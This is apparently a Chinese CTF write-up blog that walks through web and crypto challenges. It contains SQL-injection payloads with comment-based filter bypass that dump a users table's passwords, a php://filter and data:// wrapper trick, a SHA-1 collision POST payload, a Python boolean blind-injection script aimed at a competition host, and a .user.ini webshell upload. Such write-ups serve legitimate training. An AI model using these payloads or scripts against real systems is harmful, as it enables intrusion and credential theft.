<p><img src="https://i.loli.net/2020/11/30/5zEkKtamYMgWoTh.png" srcset="/img/loading.gif" alt></p>
<p>GIF89a是GIF文件内容开头的几个字符，其作用是为类绕过<code>exif_imagetype()</code></p>
<p>上传1.gif</p>
<p><img src="https://i.loli.net/2020/11/30/6sJc1x7viwNqa3Y.png" srcset="/img/loading.gif" alt></p>
<p>文件保存的路径已经给出，开始蚁剑链接的连接是</p>
<div class="hljs"><pre><code class="hljs angelscript">url/uploads/<span class="hljs-number">04</span>b0951938d905b41348c1548f9c338b/<span class="hljs-number">1.</span>gif</code></pre></div>

<p>但是一直连接不上</p>
<p>后来链接index.php才连接上，这里想到了<code>.user.ini</code>作用，是让所有的php文件包含整个一句话木马，而这里文件路径存在一个index.php，所有说index.php中也存在这个一句话木马</p>
<div class="hljs"><pre><code class="hljs llvm">/uploads/<span class="hljs-number">04</span>b<span class="hljs-number">0951938</span>d<span class="hljs-number">905</span>b<span class="hljs-number">41348</span><span class="hljs-keyword">c</span><span class="hljs-number">1548</span>f<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">338</span>b/index.php</code></pre></div>





]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>.htacess</tag>
        <tag>.user.ini</tag>
      </tags>
  </entry>
  <entry>
    <title>cumtctf</title>
    <url>/2020/09/27/cumtctf/</url>
    <content><![CDATA[<h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>提示GET一个1,那就 url+?1</p>
<p>提示post一个2</p>
<p>那就post一个</p>
<p><strong>注意的是要2=任意字符才出现源码</strong></p>
<p>审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，读取base64源码之后解码即可</p>
<p>PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs=</p>
<h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h3><p>首先判断是否存在注入<code>username=admin&amp;password=pw&#39;</code></p>
<p>在后面加上单引号后出现报错提示，确认有注入点</p>
<p>但是继续测试 <code>&#39;or 1=1 #</code>会出现</p>
<p><img src="https://i.loli.net/2020/11/30/J6rdWUDupV4iTI5.png" srcset="/img/loading.gif" alt></p>
<p>判断存在黑名单过滤。</p>
<p>接下来就是判断是将什么加入黑名单了，经过字典测试发现是<strong>空格</strong>，这里可以使用/**/绕过。</p>
<p>先测试有多少列，<code>&#39;union/**/select/**/1,2,3,4,5,6,7#</code>  到第七的时候，页面报错。</p>
<p>   <code>&#39;union/**/select/**/1,2,3,4,5,6,7,8#</code> 到第八的时候显示下图，说明一共八列，并且第四列出现回显。</p>
<p><img src="https://i.loli.net/2020/11/30/bltS5moZHWkOEGF.png" srcset="/img/loading.gif" alt></p>
<p><strong>爆表</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(TABLE_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.TABLES<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>

<p><strong>爆列名</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(COLUMN_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.COLUMNS<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_NAME=<span class="hljs-string">'users'</span><span class="hljs-comment">#</span></code></pre></div>

<p><code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code>列名很多，选择password</p>
<p><strong>爆flag</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span><span class="hljs-comment">#</span></code></pre></div>

<p><img src="/2020/09/27/cumtctf/w2-3.png" srcset="/img/loading.gif" alt></p>
<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>扫描一下目录发现存在一个<a href="http://www.zip的文件，直接下载得到源码，下面就是一层一层的绕过" target="_blank" rel="noopener">www.zip的文件，直接下载得到源码，下面就是一层一层的绕过</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include_once</span>(<span class="hljs-string">'flag.php'</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param1'</span>]))
&#123;
    $str1=$_GET[<span class="hljs-string">'param1'</span>];
    <span class="hljs-keyword">if</span>(file_get_contents($str1)!==<span class="hljs-string">'Suvin_wants_a_girlfriend'</span>)
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Suvin doesn't like you"</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param2'</span>]))&#123;
        $str2=$_GET[<span class="hljs-string">'param2'</span>];
        <span class="hljs-keyword">if</span>(!is_numeric($str2))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin prefers strings of Numbers'</span>);
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&lt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>)
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too short'</span>);
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&gt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">31</span>)
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too long'</span>);
        <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Suvin says he's falling in love with you!"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;
            sleep(intval($str2)); 
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param2'</span>])) &#123;
            $str1=$_POST[<span class="hljs-string">'param1'</span>];
            $str2=$_POST[<span class="hljs-string">'param2'</span>];
            <span class="hljs-keyword">if</span>(strlen($str1)&gt;<span class="hljs-number">1000</span>)
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's too long"</span>);
            <span class="hljs-keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))
                <span class="hljs-keyword">echo</span> $flag;
            <span class="hljs-keyword">else</span> 
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's so similar to md5"</span>);
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>首先get方式获取两个参数，param1要等于那个字符串，这里使用php的data伪协议</p>
<p>param2要在<code>3600*24*30</code>和<code>3600*24*31</code>之间，可以取2.6e6,这两个参数绕过后，就要绕过下面的post方式上传的两个值</p>
<p>对parame1的长度进行了限制，并且两参数的字符串形式不相等，sha1的值要相等，首先想到的是与md5函数一样，使用数组绕过，但是这题没那么简单，试了很多次都不行。网上搜了一下，发现了一个很类似的题目（sha1弱碰撞），其中也给出符合要求的字符串。</p>
<p><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-68953730.nonecase&utm_term=%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E4%B8%B2sha1%E4%B8%80%E6%A0%B7" target="_blank" rel="noopener">点这里</a></p>
<p>完整的payload：</p>
<p><code>?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7</code></p>
<div class="hljs"><pre><code class="hljs llvm">POST:
param<span class="hljs-number">1</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%7</span>FF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%A6</span><span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%01</span><span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%AA</span><span class="hljs-symbol">%1</span>D<span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>BE<span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%88</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8K</span><span class="hljs-symbol">%8</span>CLy<span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%E0</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%F6</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B1i</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%C5kE</span><span class="hljs-symbol">%C1S</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B7</span><span class="hljs-symbol">%608</span><span class="hljs-symbol">%E9rr</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%ADr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EI<span class="hljs-symbol">%04</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%C20W</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%E9</span><span class="hljs-symbol">%D4</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%E1.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%BC</span><span class="hljs-symbol">%94</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E35B</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%80</span>-<span class="hljs-symbol">%98</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-symbol">%C3</span><span class="hljs-symbol">%7</span>F<span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%E7M</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>C<span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8t</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-symbol">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%89</span><span class="hljs-symbol">%60</span>k<span class="hljs-symbol">%D0</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%04</span>F<span class="hljs-symbol">%29</span><span class="hljs-symbol">%A1</span>&amp;param<span class="hljs-number">2</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span>sF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%91</span>f<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%11</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%F9</span><span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%CC</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8</span><span class="hljs-symbol">%5</span>B<span class="hljs-symbol">%A8Ly</span><span class="hljs-symbol">%03</span><span class="hljs-symbol">%0</span>C<span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%E2</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%A9</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%DFE</span><span class="hljs-symbol">%C1O</span><span class="hljs-symbol">%26</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%DC8</span><span class="hljs-symbol">%E9j</span><span class="hljs-symbol">%C2</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%BDr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EE<span class="hljs-symbol">%BC</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%D2</span><span class="hljs-symbol">%3</span>CW<span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%EB</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%BBU.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E31</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%807</span><span class="hljs-symbol">%B8</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-symbol">%DF</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%EBM</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8dy</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-symbol">%2</span>Cv<span class="hljs-symbol">%21</span>V<span class="hljs-symbol">%60</span><span class="hljs-symbol">%DD0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%91</span><span class="hljs-symbol">%D0k</span><span class="hljs-symbol">%D0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%BCF</span><span class="hljs-symbol">%29</span><span class="hljs-symbol">%B1</span></code></pre></div>

<p><strong>还有一个很坑的地方，hackbar上传时没有作用，只能用bp抓包上传，抓包时注意先随便post一个参数，这样数据包才是post方式，然后贴上上面的两个参数值</strong></p>
<h3 id="babysql2"><a href="#babysql2" class="headerlink" title="babysql2"></a>babysql2</h3><p>查询语句与第一个注入相同，但是这题不给回显，猜测是盲注，但是好像过滤了更多的关键字</p>
<p>在1的基础上额外过滤了 ‘ ， ascii ， mid ， substr ，关闭了报错回显和输出，但是查询成功或者失败 回显不同，因此可以bool注入。</p>
<div class="hljs"><pre><code class="hljs python">url = <span class="hljs-string">'http://219.219.61.234:20004/'</span>
password = <span class="hljs-string">""</span>
string = [ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;'</span>]<span class="hljs-comment">#将字母转换为ascii码</span>
a = <span class="hljs-string">'0x5e'</span>   <span class="hljs-comment"># '\'的ascii码值</span>
<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:
        <span class="hljs-keyword">if</span> (hex(j)[<span class="hljs-number">2</span>:]==<span class="hljs-string">'7b'</span>):
            str=<span class="hljs-string">'5c'</span>+hex(j)[<span class="hljs-number">2</span>:]  <span class="hljs-comment">#将'&#123;'转义，</span>
        <span class="hljs-keyword">else</span>:
            str=hex(j)[<span class="hljs-number">2</span>:]

        time.sleep(<span class="hljs-number">0.1</span>)

        payload  =<span class="hljs-string">"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#"</span> % (a + str)
<span class="hljs-comment"># 盲注的查询语句 regexp binary 是区分大小写的正则匹配</span>
        data =&#123;<span class="hljs-string">"username"</span>:<span class="hljs-string">"\\"</span>,<span class="hljs-string">"password"</span>:payload&#125;
        print(data)
        r = requests.post(url,data=data) <span class="hljs-comment">#访问</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"success"</span> <span class="hljs-keyword">in</span> r.text:
            <span class="hljs-comment">#print(r.text)</span>
            password+=chr(j)
            print(password)
            a+=str      		
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">"wrong"</span> <span class="hljs-keyword">in</span> r.text:
        <span class="hljs-keyword">break</span>
print(password)</code></pre></div>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h3><p>先转换为十进制后在线分解后直接上脚本</p>
<p><a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> 在线分解网址</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> sys
sys.setrecursionlimit(<span class="hljs-number">1000000</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ByteToHex</span><span class="hljs-params">(bins)</span>:</span>
  <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">"%02X"</span> % x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bins]).strip()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
    t = <span class="hljs-string">'0'</span> + t
  \<span class="hljs-comment">#print(t)</span>
  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a, b)</span>:</span>
  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:
    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
  <span class="hljs-keyword">else</span>:
    g, y, x = egcd(b % a, a)
    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modinv</span><span class="hljs-params">(a, m)</span>:</span>
  g, x, y = egcd(a, m)
  <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:
    print(<span class="hljs-string">'modular inverse does not exist'</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'null'</span>
  <span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">return</span> x % m
c = <span class="hljs-number">40448992051548719008529549070468060415257485938698092782029814901918646701101</span>
p = <span class="hljs-number">328413456989577256301798468872388310877</span>
q = <span class="hljs-number">324350545929838254331191385863847627003</span>
e = <span class="hljs-number">65537</span>
n = p * q
d = modinv(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))
m = pow(c, d, n)

<span class="hljs-keyword">print</span> (m)</code></pre></div>



<p>数字转字符的脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
    t = <span class="hljs-string">'0'</span> + t
  \<span class="hljs-comment">#print(t)</span>
  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
print(n2s(a)) <span class="hljs-comment">#a为上一个脚本计算出的数字</span></code></pre></div>



<h3 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h3><h3 id="初中生的密码题"><a href="#初中生的密码题" class="headerlink" title="初中生的密码题"></a>初中生的密码题</h3><p>次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。</p>
<p>仔细看题会发现这题的条件给的比较多,知道p-q</p>
<p>于是想到了<code>(p+q)^2-(p-q)^2=4pq=4n</code>，可以算出p+q,之后解出p,q</p>
<div class="hljs"><pre><code class="hljs python">算p,q的脚本
<span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/9/24 21:55</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : su.py</span>
<span class="hljs-keyword">import</span> gmpy2
n = <span class="hljs-number">848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397</span>
p_sub_q = <span class="hljs-number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span>
x = (<span class="hljs-number">4</span>*n+p_sub_q*p_sub_q)

gmpy2.mpz(x)
<span class="hljs-comment">#p_add_q = gmpy2.iroot(x, 2)</span>
p_add_q = <span class="hljs-number">58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078</span>
<span class="hljs-comment"># print(p_add_q)</span>
y=(p_sub_q+p_add_q)
z=(p_add_q-p_sub_q)

print(y&gt;&gt;<span class="hljs-number">1</span>)
